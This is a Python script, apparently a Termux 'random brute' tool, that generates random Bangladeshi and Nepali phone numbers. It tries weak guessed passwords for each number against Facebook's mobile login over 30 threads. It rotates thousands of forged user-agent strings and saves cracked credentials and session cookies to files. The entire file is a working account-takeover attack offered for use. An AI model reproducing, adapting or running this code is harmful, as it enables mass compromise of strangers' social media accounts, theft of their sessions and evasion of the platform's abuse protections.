#MD YOUSUF
#python
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
session = requests.Session()   
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r no Active  Apk ')
    else:
        print(f'\rActive Apk')
        for i in range(len(game)):
            print(f"\r\r "%(i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
        else:
            print(f'\r  invalid cookie')
            
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
oks=[]
cps=[]
loop=0
def clear():
    os.system('clear')
def linex():
	print(42*'-')
def chatbot():
	print(f'{M}[{B}1{M}] {B}FACEBOOK\n{M}[{B}2{M}] {B}WHATSAPP')
	chat = input(f"{M}[{B}#{M}] {B}CHOCE : ")
	if chat =='1':
		os.system('xdg-open https://wa.me/+8801837478901')
		main()
	elif chat =='2':
		os.system('xdg-open https://wa.me/+8801837478901')
		main()
logo=(f"""
-----------------------------------------
{M}[{B}•{M}] {P}FACEBOOK{B}/{C}TIKTOK{B}/{H}FREEFIRE/{bblack}INSTAGRAM
{M}[{B}•{M}] {B}WARNING : Legal and safe use only.
{M}[{B}•{M}] {B}OWNER : 𓆩💜𓆪𝐌𝒹γ𝖚ຮ𝖚ϝ𓆩💜𓆪
{M}[{B}•{M}] {B}TOOLS : {H}RANDOM BRUT
{M}[{B}•{M}] {B}GITHUB : Legendhj
-----------------------------------------""")


def main():
	os.system('clear')
	print(logo)
	print(f"{M}[{B}1{M}] {B}RANDOM BRUT\n{M}[{B}2{M}] {B}NEPAL BRUT\n{M}[{B}3{M}] {B}CONTACT ME")
	print(42*'-')
	option = input(f"{M}[{B}#{M}] {B}CHOSE : ")
	if option =='1':
		crack()
	elif option =='2':
		nepal()
	elif option =='3':
		chatbot()
	else:
		print (f"[#] {M}PLEASE SELECT CORRECTLY")
		time.sleep(1)
		main()
ugen=[]		
"""for x in range(10000):
	xs = (f'Mozilla/5.0 (Linux; Android {str(random.randint(7,10))}; moto g(7) optimo (XT1952DL) Build/QPYS30.85-21-8; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(50,100))}.0.{str(random.randint(4000,6000))}.{str(random.randint(40,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;]')
	ugen.append(xs)"""
ugen=[]		
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='SM-G996U Build/'
        s='190711.020; wv)'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}.{s} {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

        aa='Mozilla/5.0 (Linux; Android 10; Nokia C1 Plus Build/QP1A.190711.020; wv)'
        b=random.choice(['10','10'])
        c='Android 10; Nokia C1 Plus Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,115)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/364.0.0.14.77;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
        aa='Mozilla/5.0 (Linux; Android 9; TECNO BB4k Build/PPR1.180610.011; wv)'
        b=random.choice(['9','9'])
        c='Android 9; TECNO BB4k Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,115)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/332.0.0.22.108;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
        aa='Mozilla/5.0 (Linux; Android 10; Infinix X682C Build/QP1A.190711.020; wv)'
        b=random.choice(['10','10'])
        c='Android 10; Infinix X682C Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,115)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
   

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 10; moto g(7) Build/QPUS30.52-16-2-7-8; wv)'
        b=random.choice(['9','10','11','12','13','14'])
        c='Android 10; moto g(7) Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.65'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,110)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/343.0.0.13.79;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

        aa='Mozilla/5.0 (Linux; Android 12; 220333QBI Build/SKQ1.211103.001; wv)'
        b=random.choice(['9','10','11','12','13','14'])
        c='Android 12; 220333QBI Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,103)
        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)   

        aa='Mozilla/5.0 (Linux; Android 13; RMX3371 Build/TP1A.220905.001; wv)'
        b=random.choice(['9','10','11','12','13','14'])
        c='Android 13; RMX3371 Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,115)
        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)      

        aa='Mozilla/5.0 (Linux; Android 10; Nokia C1 Plus Build/QP1A.190711.020; wv)'
        b=random.choice(['9','10','11','12','13','14'])
        c='Android 10; Nokia C1 Plus Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,115)
        l='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/364.0.0.14.77;]'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
        
for tg in range(5000):
  a='Mozilla/5.0 (Linux; Android '
  b=random.choice(['9','10','11','12','13','14','15'])
  c='Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  d=random.randrange(40,115)
  e='0'
  f=random.randrange(3000,6000)
  g=random.randrange(20,100)
  h=' Mobile Safari/537.36'
  anik=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
  ugen.append(anik)
  
  a='Mozilla/5.0 (Linux; Android '
  b=random.choice(['9','10','11','12','13','14','15'])
  c='Redmi Note 8 Build/TQ3A.230705.001.B4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  d=random.randrange(40,115)
  e='0'
  f=random.randrange(3000,6000)
  g=random.randrange(20,100)
  h=' Mobile Safari/537.36'
  anik=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
  ugen.append(anik)
  
  a='Mozilla/5.0 (Linux; Android '
  b=random.choice(['9','10','11','12','13','14','15'])
  c='MI 8 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  d=random.randrange(40,115)
  e='0'
  f=random.randrange(3000,6000)
  g=random.randrange(20,100)
  h=' Mobile Safari/537.36'
  anik=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
  ugen.append(anik)
  
  a='Mozilla/5.0 (Linux; Android '
  b=random.choice(['9','10','11','12','13','14','15'])
  c='21061119DG Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
  d=random.randrange(40,115)
  e='0'
  f=random.randrange(3000,6000)
  g=random.randrange(20,100)
  h=' Mobile Safari/537.36'
  anik=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
  ugen.append(anik)
  
  a='Mozilla/5.0 (Linux; Android '
  b=random.choice(['9','10','11','12','13','14','15'])
  c='Redmi 9 Pro Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  d=random.randrange(40,115)
  e='0'
  f=random.randrange(3000,6000)
  g=random.randrange(20,100)
  h=' Mobile Safari/537.36'
  anik=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
  ugen.append(anik)
  
  a='Mozilla/5.0 (Linux; Android '
  b=random.choice(['9','10','11','12','13','14','15'])
  c='Redmi Y3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
  d=random.randrange(40,115)
  e='0'
  f=random.randrange(3000,6000)
  g=random.randrange(20,100)
  h=' Mobile Safari/537.36'
  anik=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
  ugen.append(anik)
def Christmas(cid):
    if len(cid)==15:
        if cid[:10] in ['1000000000']       :legend = ' (*-*) 2009'
        elif cid[:9] in ['100000000']       :legend = '√ 2009'
        elif cid[:8] in ['10000000']        :legend = '√ 2009'
        elif cid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:legend = '√ 2009'
        elif cid[:7] in ['1000006','1000007','1000008','1000009']:legend = ' 2010'
        elif cid[:6] in ['100001']          :legend = '√ 2010/2011'
        elif cid[:6] in ['100002','100003'] :legend = '√ 2011/2012'
        elif cid[:6] in ['100004']          :legend = '√ 2012/2013'
        elif cid[:6] in ['100005','100006'] :legend = '√ 2013/2014'
        elif cid[:6] in ['100007','100008'] :legend = '√ 2014/2015'
        elif cid[:6] in ['100009']          :legend = '√ 2015'
        elif cid[:5] in ['10001']           :legend = '√ 2015/2016'
        elif cid[:5] in ['10002']           :legend = '√ 2016/2017'
        elif cid[:5] in ['10003']           :legend = '√ 2018/2019'
        elif cid[:5] in ['10004']           :legend = '√ 2019/2020'
        elif cid[:5] in ['10005']           :legend = '√ 2020'
        elif cid[:5] in ['10006','10007','']:legend = '√ 2021'
        elif cid[:5] in ['10008']           :legend = '√ 2022'
        elif cid[:5] in ['10009']           :legend = '√ 2023'
        else:legend=''
    elif len(cid) in [9,10]:
        legend = ' √ 2008/2009'
    elif len(cid)==8:
        legend = '√ 2007/2008'
    elif len(cid)==7:
        legend = '√ 2006/2007'
    else:legend=''
    return legend
    
def nepal():
	user=[]
	os.system('clear')
	print(logo)
	print(f'{M}[{B}•{M}] {B}EXAMPLE : 1000/2000/5000/')
	limit = int(input(f'{M}[{B}•{M}] {B}CHOSE : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(8))
		user.append("031"+nmp)
	with ThreadPool(max_workers=30) as few:
		clear()
		tl = str(len(user))
		os.system('clear')
		print(logo)
		print(f'{M}[{B}•{M}] {B}TOTAL IDS: '+tl)
		print(f'{M}[{B}•{M}] {B}YOU R CODE : 977')
		print(42*'-')
		for idx in user:
			pas = [idx,idx[1:],'57273200']
			few.submit(rcrack,idx,pas)
        
      	
    
def crack():
    user=[]
    os.system("clear")
    print(logo)
    print(f'{M}[{B}•{M}] {B}EXAMPLE : 018|017|019|016')
    print(42*'-')
    code = input(f"{M}[{B}•{M}] {B}ENTER CODE : ")
    print(42*'-')
    print(f'{M}[{B}•{M}] {B}EXAMPLE : 1000|2000|5000|50000')
    print(42*'-')
    limit = int(input(f'{M}[{B}•{M}] {B}ENTER LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as few:
        clear()
        tl = str(len(user))
        os.system('clear')
        print(logo)
        print(f'{M}[{B}•{M}] {B}TOTAL IDS: '+tl)
        print(f'{M}[{B}•{M}] {B}YOU R CODE : '+code)
        print(42*'-')
        for sex in user:
        	idx = code+sex
        	pas = [idx,sex[1:],idx[:7],idx[:8],'i love you','Bangladesh']
        	few.submit(rcrack,idx,pas)
          
def rcrack(idx,pas):
    global loop
    global cps
    global oks
    try:
        for ps in pas:
            pro = random.choice(ugen)
            sys.stdout.write(f'\r\r{M}[{B}CRACKING{M}] {B}• {M}[{B}%s{M}] {B}• {M}[{B}OK%s{M}] '%(loop,len(oks))),
            sys.stdout.flush()
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com/').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":idx,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '1.600000023841858',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"Redmi Y3"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'\r\r{H}[Login] {idx} | {ps} ')
                print(f'\r\r{coki}')
                open('/sdcard/status-OK.txt', 'a').write( idx+' | '+ps+'\n')
                oks.append(idx)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f'\r\r[CHECKPOINT] {cid} | {ps} | {Christmas(cid)}')
                open('/sdcard/status-CP.txt', 'a').write( idx+' | '+ps+' \n')
                cps.append(idx)
                break
            else:
                continue
        loop+=1
    except:
        pass

main()
      
